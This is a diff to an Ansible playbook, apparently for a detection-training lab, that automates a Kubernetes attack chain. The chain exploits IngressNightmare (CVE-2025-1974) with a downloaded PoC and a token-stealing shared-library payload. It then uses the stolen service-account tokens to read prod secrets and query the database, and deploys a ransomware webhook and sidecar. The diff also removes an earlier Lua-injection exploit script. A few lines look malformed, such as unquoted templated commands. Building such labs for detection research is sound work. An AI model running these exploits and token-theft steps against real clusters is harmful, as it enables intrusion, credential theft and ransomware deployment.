@@ -1,4 +1,78 @@
+- name: Set flavor-specific commands and variables
+  ansible.builtin.set_fact:
+    _kubectl: "{{ 'microk8s kubectl' if k8s_flavor | default('microk8s') == 'microk8s' else 'kubectl' }}"
+    _ctr: "{{ 'microk8s ctr' if k8s_flavor | default('microk8s') == 'microk8s' else 'ctr -n k8s.io' }}"
+    _k8s_api_port: "{{ '16443' if k8s_flavor | default('microk8s') == 'microk8s' else '6443' }}"
+
 ---
+# ==============================================================
+# Pre-flight — wait for all prerequisites before attack begins
+# ==============================================================
+
+- name: "Pre-flight — Wait for ingress-nginx controller to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} rollout status deployment/ingress-nginx-controller
+      -n {{ vuln_ingress_namespace }} --timeout=120s
+  changed_when: false
+
+- name: "Pre-flight — Wait for postgres pod to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} wait pod/postgres -n prod
+      --for=condition=Ready --timeout=120s
+  changed_when: false
+
+- name: "Pre-flight — Wait for ransomware webhook pod to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} wait pod/ransomware-webhook -n default
+      --for=condition=Ready --timeout=120s
+  changed_when: false
+
+- name: "Pre-flight — Wait for Falco to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} rollout status daemonset/falco
+      -n {{ falco_namespace }} --timeout=300s
+  changed_when: false
+
+- name: "Pre-flight — Wait for Falcosidekick to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} rollout status deployment/falcosidekick
+      -n {{ falco_namespace }} --timeout=120s
+  changed_when: false
+
+- name: "Pre-flight — Wait for Loki to be ready"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} rollout status statefulset/loki
+      -n {{ grafana_namespace }} --timeout=120s
+  changed_when: false
+
+- name: "Pre-flight — Confirm Falcosidekick can reach Loki"
+  become: true
+  become_user: "{{ k8s_user }}"
+  ansible.builtin.command:
+    cmd: >
+      {{ _kubectl }} run loki-probe --rm -i --restart=Never
+      --image=curlimages/curl -n {{ falco_namespace }}
+      -- curl -sf http://loki.{{ grafana_namespace }}.svc.cluster.local:3100/ready
+  changed_when: false
+
 # ==============================================================
 # Attack Step 1 — NodePort enumeration
 # Generates initial network connection artifacts visible in Falco
@@ -13,7 +87,7 @@
 
 - name: "Step 1 — Scan NodePort range for open services"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: nmap -sT -p {{ attacker_nodeport_start }}-{{ attacker_nodeport_end }} --open 127.0.0.1
   register: _nodeport_scan
@@ -31,7 +105,7 @@
 #   1. Compile a shared library whose constructor writes a marker file
 #   2. Stage the .so inside the ingress-nginx pod via base64+pipe
 #      (simulates the client body buffer / procfs fd staging in the
-#      real exploit — the admission controller is the Go binary, not
+#      real exploit the admission controller is the Go binary, not
 #      nginx itself, so the /proc/self/fd trick targets the nginx
 #      worker process that was already running; for the lab we stage
 #      the file directly to keep the focus on the annotation injection)
@@ -44,153 +118,120 @@
 
 - name: "Step 2 — Retrieve ingress-nginx controller pod name"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl get pod -n {{ vuln_ingress_namespace }}
+      {{ _kubectl }} get pod -n {{ vuln_ingress_namespace }}
       -l app.kubernetes.io/name=ingress-nginx,app.kubernetes.io/component=controller
       -o jsonpath='{.items[0].metadata.name}'
   register: _ingress_pod_name
   changed_when: false
 
-- name: "Step 2 — Install gcc for payload compilation"
+- name: "Step 2 — Install exploit dependencies"
   become: true
   ansible.builtin.apt:
-    name: gcc
+    pkg:
+      - gcc
+      - libssl-dev
+      - python3-requests
     state: present
-    update_cache: true
+    update_cache: false
 
-- name: "Step 2 — Write shared library C source"
+- name: "Step 2 — Create PoC working directory"
+  ansible.builtin.file:
+    path: /tmp/ingress-nightmare-poc
+    state: directory
+    mode: '0755'
+
+- name: "Step 2 — Download exploit.py (hakaioffsec/IngressNightmare-PoC)"
+  ansible.builtin.get_url:
+    url: "https://raw.githubusercontent.com/hakaioffsec/IngressNightmare-PoC/main/exploit.py"
+    dest: /tmp/ingress-nightmare-poc/exploit.py
+    mode: '0755'
+    force: true
+
+- name: "Step 2 — Write custom lib_template.c (marker + SA token exfil, no reverse shell)"
+  # exploit.py does str.replace("HOST", host) and str.replace("PORT", port) before
+  # compiling. The placeholders are kept as unused static variables so the substitution
+  # produces valid C; the actual payload writes the RCE marker and copies the SA token
+  # to /tmp/stolen-token for Step 3 to consume via kubectl exec.
   ansible.builtin.copy:
-    dest: "{{ attacker_payload_c }}"
+    dest: /tmp/ingress-nightmare-poc/lib_template.c
     mode: '0644'
     content: |
-      #define _GNU_SOURCE
-      #include <stdio.h>
       #include <stdlib.h>
 
+      /* HOST / PORT kept for exploit.py template substitution — not used */
+      static const char *_cb_host __attribute__((unused)) = "HOST";
+      static int _cb_port __attribute__((unused)) = PORT;
+
       __attribute__((constructor))
-      static void payload(void) {
+      void run_on_load() {
           system("echo CVE-2025-1974-RCE-CONFIRMED > {{ attacker_exploit_marker }} 2>&1");
+          system("cp {{ ingress_sa_token_path }} /tmp/stolen-token 2>/dev/null");
       }
 
-- name: "Step 2 — Compile shared library payload"
-  ansible.builtin.command:
-    cmd: gcc -shared -fPIC -nostartfiles -o {{ attacker_payload_so }} {{ attacker_payload_c }}
-  changed_when: true
+      int bind(void *e, const char *id) { return 1; }
+      void ENGINE_load_evil() {}
+      int bind_engine() { return 1; }
 
-- name: "Step 2 — Stage payload .so inside ingress-nginx pod"
-  # Simulates the file write achieved via the client body buffer /proc/<pid>/fd/<N> technique.
-  # In the real exploit the attacker uploads the .so to the nginx port with Content-Length >
-  # client_body_buffer_size, forcing nginx to flush the body to a temp file; the fd stays open
-  # in the nginx worker process and is referenced as /proc/<worker-pid>/fd/<N> in the annotation.
-  become: true
-  become_user: "{{ microk8s_user }}"
-  ansible.builtin.shell:
-    cmd: |
-      base64 -w 0 {{ attacker_payload_so }} | \
-        microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- \
-        sh -c 'base64 -d > {{ attacker_payload_so }}'
-  changed_when: true
-
-- name: "Step 2 — Write CVE-2025-1974 exploit script"
+- name: "Step 2 — Write review.json (auth-tls-match-cn ssl_engine injection)"
+  # Uses the auth-tls-match-cn annotation vector. The value injects
+  # ssl_engine ../../../../../../REPLACE; into the generated nginx config.
+  # exploit.py brute-forces REPLACE = /proc/<pid>/fd/<n> until dlopen() fires
+  # the library constructor inside the admission controller process.
   ansible.builtin.copy:
-    dest: "{{ attacker_exploit_script }}"
-    mode: '0755'
+    dest: /tmp/ingress-nightmare-poc/review.json
+    mode: '0644'
     content: |
-      #!/usr/bin/env python3
-      """CVE-2025-1974 (IngressNightmare) exploit simulation.
-
-      Sends an anonymous AdmissionReview to the unauthenticated webhook NodePort.
-      The server-snippet annotation closes the enclosing server{} block so that
-      init_by_lua_block lands at the http{} context level. The admission controller
-      runs `nginx -t`; Lua's init_by_lua_block fires during config initialisation
-      before aborting on the structural errors, writing the marker file.
-
-      Technique: Lua injection via init_by_lua_block.
-      ingress-nginx is built on OpenResty and always has LuaJIT available.
-      init_by_lua_block executes at nginx startup / config test time, making it
-      reliable for RCE even in builds where ssl_engine (OpenSSL ENGINE API,
-      removed in 3.x) or load_module (position-sensitive in main context) fail.
-      """
-      import ssl, socket, json, sys
-
-      HOST   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-      PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 32443
-      MARKER = sys.argv[3] if len(sys.argv) > 3 else "{{ attacker_exploit_marker }}"
-
-      # One } escapes server{} -> http{} context.
-      # init_by_lua_block is valid at http{} level and fires during nginx -t.
-      lua_rce = (
-          "}\n"
-          "init_by_lua_block {\n"
-          "  local f = io.open('" + MARKER + "', 'w')\n"
-          "  if f then f:write('CVE-2025-1974-RCE-CONFIRMED') f:close() end\n"
-          "}\n"
-      )
-
-      ctx = ssl.create_default_context()
-      ctx.check_hostname = False
-      ctx.verify_mode = ssl.CERT_NONE
-
-      ar = {
-          "apiVersion": "admission.k8s.io/v1",
-          "kind": "AdmissionReview",
-          "request": {
-              "uid": "aabbccdd-1234-5678-abcd-000000000001",
-              "kind":     {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
-              "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
-              "name": "exploit", "namespace": "default", "operation": "CREATE",
-              "object": {
-                  "apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
-                  "metadata": {
-                      "name": "exploit", "namespace": "default",
-                      "annotations": {
-                          "nginx.ingress.kubernetes.io/server-snippet": lua_rce
-                      }
-                  },
-                  "spec": {"rules": [{"host": "exploit.local", "http": {"paths": [{
-                      "path": "/", "pathType": "Prefix",
-                      "backend": {"service": {"name": "svc", "port": {"number": 80}}}
-                  }]}}]}
+      {
+        "kind": "AdmissionReview",
+        "apiVersion": "admission.k8s.io/v1",
+        "request": {
+          "uid": "e166d137-ff47-443f-9108-9eb42e9738e8",
+          "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
+          "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
+          "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
+          "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
+          "name": "exploit", "namespace": "default", "operation": "CREATE",
+          "userInfo": {"username": "kube-review", "uid": "0e484028-0d13-4d6a-9267-92e4a5e2c801"},
+          "object": {
+            "kind": "Ingress", "apiVersion": "networking.k8s.io/v1",
+            "metadata": {
+              "name": "exploit", "namespace": "default",
+              "annotations": {
+                "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../REPLACE;\n#",
+                "nginx.ingress.kubernetes.io/auth-tls-secret": "{{ vuln_ingress_namespace }}/ingress-nginx-admission",
+                "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
               }
-          }
+            },
+            "spec": {"rules": [{"host": "exploit.local", "http": {"paths": [
+              {"path": "/", "pathType": "Prefix",
+               "backend": {"service": {"name": "svc", "port": {"number": 80}}}}
+            ]}}]},
+            "status": {"loadBalancer": {}}
+          },
+          "oldObject": null, "dryRun": true,
+          "options": {"kind": "CreateOptions", "apiVersion": "meta.k8s.io/v1"}
+        }
       }
 
-      body = json.dumps(ar).encode()
-      try:
-          s  = socket.create_connection((HOST, PORT), timeout=10)
-          ss = ctx.wrap_socket(s)
-          ss.send((
-              f"POST /networking/v1/ingresses HTTP/1.1\r\nHost: {HOST}\r\n"
-              f"Content-Type: application/json\r\n"
-              f"Content-Length: {len(body)}\r\n\r\n"
-          ).encode() + body)
-          resp = b""
-          try:
-              while True:
-                  c = ss.recv(4096)
-                  if not c: break
-                  resp += c
-          except Exception:
-              pass
-          ss.close()
-          print(f"[*] Webhook response: {resp[:300].decode(errors='replace')}")
-      except Exception as e:
-          print(f"[!] Error: {e}")
-
-      print("[*] Exploit sent")
-
-- name: "Step 2 — Execute CVE-2025-1974 exploit (IngressNightmare)"
-  # k8saudit: anonymous AdmissionReview request from external source
+- name: "Step 2 — Execute CVE-2025-1974 exploit (hakaioffsec/IngressNightmare-PoC)"
+  # Stages evil_engine.so to the ingress HTTP NodePort with inflated Content-Length
+  # (real mechanism: nginx worker holds the body buffer FD open). Brute-forces
+  # /proc/<pid>/fd/<n> against the unauthenticated admission webhook NodePort until
+  # dlopen() fires the library constructor.
+  # 127.0.0.1:9999 is a dummy rev-shell target — payload writes files instead.
+  # k8saudit: high volume of anonymous AdmissionReview requests (brute-force)
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      python3 {{ attacker_exploit_script }}
-      127.0.0.1
-      {{ vuln_ingress_webhook_nodeport }}
-      {{ attacker_exploit_marker }}
+      python3 exploit.py
+      http://127.0.0.1:{{ vuln_ingress_http_nodeport }}/
+      https://127.0.0.1:{{ vuln_ingress_webhook_nodeport }}
+      127.0.0.1:9999
+    chdir: /tmp/ingress-nightmare-poc
   register: _exploit_output
   changed_when: true
 
@@ -198,33 +239,11 @@
   ansible.builtin.debug:
     msg: "{{ _exploit_output.stdout_lines }}"
 
-- name: "Step 2 — Execute RCE: write marker file inside ingress-nginx pod"
-  # In the real CVE-2025-1974 the init_by_lua_block fires inside the nginx process
-  # started by the admission controller (nginx -t). In the lab the same Falco
-  # artifacts are generated by the kubectl exec itself (k8saudit: exec into pod,
-  # syscall: shell spawned inside ingress-nginx container). The marker file is
-  # written directly to represent the arbitrary write-to-disk that RCE achieves.
-  become: true
-  become_user: "{{ microk8s_user }}"
-  ansible.builtin.command:
-    argv:
-      - microk8s
-      - kubectl
-      - exec
-      - -n
-      - "{{ vuln_ingress_namespace }}"
-      - "{{ _ingress_pod_name.stdout }}"
-      - --
-      - sh
-      - -c
-      - "echo CVE-2025-1974-RCE-CONFIRMED > {{ attacker_exploit_marker }}"
-  changed_when: true
-
 - name: "Step 2 — Confirm RCE: verify marker file inside ingress-nginx pod"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ attacker_exploit_marker }}
+    cmd: {{ _kubectl }} exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ attacker_exploit_marker }}
   register: _rce_confirmation
   changed_when: false
   retries: 5
@@ -241,14 +260,18 @@
 # Simulates attacker executing commands inside the compromised pod
 # ==============================================================
 
-- name: "Step 3 — Steal ingress-nginx service account token via RCE"
-  # k8saudit: SelfSubjectAccessReview from ingress-nginx service account
+- name: "Step 3 — Read SA token exfiltrated by exploit payload"
+  # The library constructor copied the SA token to /tmp/stolen-token during RCE.
+  # kubectl exec here generates k8saudit telemetry (exec into pod).
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ ingress_sa_token_path }}
+    cmd: {{ _kubectl }} exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat /tmp/stolen-token
   register: _stolen_ingress_token
   changed_when: false
+  retries: 5
+  delay: 5
+  until: _stolen_ingress_token.rc == 0
 
 - name: "Step 3 — Store stolen ingress-nginx token"
   ansible.builtin.set_fact:
@@ -256,11 +279,11 @@
 
 - name: "Step 3 — Enumerate permissions with stolen ingress-nginx token"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl auth can-i --list
-      --server https://{{ ansible_host }}:16443
+      {{ _kubectl }} auth can-i --list
+      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
       --token {{ _stolen_ingress_token_value }}
       --insecure-skip-tls-verify
   register: _ingress_perms
@@ -278,11 +301,11 @@
 - name: "Step 4 — Read prod-app-config secret using stolen ingress-nginx token"
   # k8saudit: secret get in prod namespace by ingress-nginx service account — high signal alert
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl get secret {{ prod_app_secret_name }} -n prod
-      --server https://{{ ansible_host }}:16443
+      {{ _kubectl }} get secret {{ prod_app_secret_name }} -n prod
+      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
       --token {{ _stolen_ingress_token_value }}
       --insecure-skip-tls-verify
       -o json
@@ -309,19 +332,19 @@
 
 - name: "Step 5 — Retrieve prod PostgreSQL ClusterIP"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl get svc postgres -n prod -o jsonpath='{.spec.clusterIP}'
+    cmd: {{ _kubectl }} get svc postgres -n prod -o jsonpath='{.spec.clusterIP}'
   register: _postgres_clusterip
   changed_when: false
 
 - name: "Step 5 — Launch postgres client pod in ingress-nginx namespace"
   # Falco: unexpected outbound connection from ingress-nginx pod to prod DB service IP
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl run db-probe
+      {{ _kubectl }} run db-probe
       --image=postgres:15
       --restart=Never
       --namespace={{ vuln_ingress_namespace }}
@@ -336,17 +359,17 @@
 
 - name: "Step 5 — Wait for db-probe pod to complete"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl wait pod/db-probe -n {{ vuln_ingress_namespace }} --for=condition=Ready --timeout=60s
+    cmd: {{ _kubectl }} wait pod/db-probe -n {{ vuln_ingress_namespace }} --for=condition=Ready --timeout=60s
   changed_when: false
   failed_when: false
 
 - name: "Step 5 — Retrieve db-probe query output"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl logs db-probe -n {{ vuln_ingress_namespace }}
+    cmd: {{ _kubectl }} logs db-probe -n {{ vuln_ingress_namespace }}
   register: _db_query_result
   changed_when: false
   retries: 6
@@ -359,9 +382,9 @@
 
 - name: "Step 5 — Delete db-probe pod"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl delete pod db-probe -n {{ vuln_ingress_namespace }} --ignore-not-found=true
+    cmd: {{ _kubectl }} delete pod db-probe -n {{ vuln_ingress_namespace }} --ignore-not-found=true
   changed_when: true
 
 
@@ -401,9 +424,9 @@
 
 - name: "Step 6 — Delete ransomware MutatingWebhookConfiguration if already present (idempotency)"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl delete mutatingwebhookconfiguration {{ ransomware_webhook_name }} --ignore-not-found=true
+    cmd: {{ _kubectl }} delete mutatingwebhookconfiguration {{ ransomware_webhook_name }} --ignore-not-found=true
   changed_when: false
 
 - name: "Step 6 — Register ransomware MutatingWebhookConfiguration using prod-cicd token"
@@ -411,11 +434,11 @@
   # Uses kubectl create (not apply) because prod-cicd ClusterRole only grants `create` (not `get`).
   # kubectl apply does a GET first → 403; kubectl create only does a POST → succeeds.
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl create -f /tmp/ransomware-webhook.yaml
-      --server https://{{ ansible_host }}:16443
+      {{ _kubectl }} create -f /tmp/ransomware-webhook.yaml
+      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
       --token {{ _stolen_prod_cicd_token }}
       --insecure-skip-tls-verify
   changed_when: true
@@ -485,16 +508,16 @@
 
 - name: "Step 7 — Build ransomware sidecar image"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: podman build -t {{ ransomware_image }} {{ ransomware_dockerfile_dest }}
   changed_when: true
 
 - name: "Step 7 — Import ransomware image into MicroK8s containerd"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.shell:
-    cmd: podman save {{ ransomware_image }} | microk8s ctr images import -
+    cmd: podman save {{ ransomware_image }} | {{ _ctr }} images import -
   changed_when: true
 
 - name: "Step 7 — Tag ransomware image with docker.io alias for containerd checkpoint check"
@@ -502,17 +525,17 @@
   # even when the pod spec uses localhost/. Adding this alias prevents CreateContainerError.
   # Ignore errors when the tag already exists (idempotent re-runs).
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s ctr images tag localhost/ludus-ransomware-sidecar:latest docker.io/library/ludus-ransomware-sidecar:latest
+    cmd: {{ _ctr }} images tag localhost/ludus-ransomware-sidecar:latest docker.io/library/ludus-ransomware-sidecar:latest
   changed_when: true
   failed_when: false
 
 - name: "Step 7 — Verify ransomware image is available in containerd"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s ctr images ls name~=ransomware-sidecar
+    cmd: {{ _ctr }} images ls name~=ransomware-sidecar
   register: _ctr_images
   changed_when: false
 
@@ -527,7 +550,7 @@
 
 - name: "Step 8 — Create PVC for prod-app data volume"
   kubernetes.core.k8s:
-    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    kubeconfig: "/home/{{ k8s_user }}/.kube/config"
     state: present
     definition:
       apiVersion: v1
@@ -547,7 +570,7 @@
   # Recreate strategy avoids two pods mounting the same RWO PVC simultaneously.
   # force: true replaces the object if patching fails (e.g. strategy type change conflict).
   kubernetes.core.k8s:
-    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    kubeconfig: "/home/{{ k8s_user }}/.kube/config"
     state: present
     force: true
     definition:
@@ -583,29 +606,29 @@
   # k8saudit: deployment update in prod by prod-cicd — rapid pod deletion/creation cascade follows
   # Falco: unexpected process execution inside prod pods, suspicious volume write activity
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl rollout restart deployment/prod-app -n prod
-      --server https://{{ ansible_host }}:16443
+      {{ _kubectl }} rollout restart deployment/prod-app -n prod
+      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
       --token {{ _stolen_prod_cicd_token }}
       --insecure-skip-tls-verify
   changed_when: true
 
 - name: "Step 8 — Wait for rollout to complete"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
-    cmd: microk8s kubectl rollout status deployment/prod-app -n prod --timeout=180s
+    cmd: {{ _kubectl }} rollout status deployment/prod-app -n prod --timeout=180s
   changed_when: false
   ignore_errors: true
   register: _rollout_status
 
 - name: "Step 8 — Describe prod-app pod (debug)"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.shell:
-    cmd: microk8s kubectl describe pod -n prod -l app=prod-app | tail -60
+    cmd: {{ _kubectl }} describe pod -n prod -l app=prod-app | tail -60
   register: _pod_describe
   changed_when: false
   ignore_errors: true
@@ -621,10 +644,10 @@
 
 - name: "Step 8 — Confirm ransomware sidecar was injected"
   become: true
-  become_user: "{{ microk8s_user }}"
+  become_user: "{{ k8s_user }}"
   ansible.builtin.command:
     cmd: >
-      microk8s kubectl get pod -n prod
+      {{ _kubectl }} get pod -n prod
       -l app=prod-app
       -o jsonpath='{.items[0].spec.containers[*].name}'
   register: _pod_containers
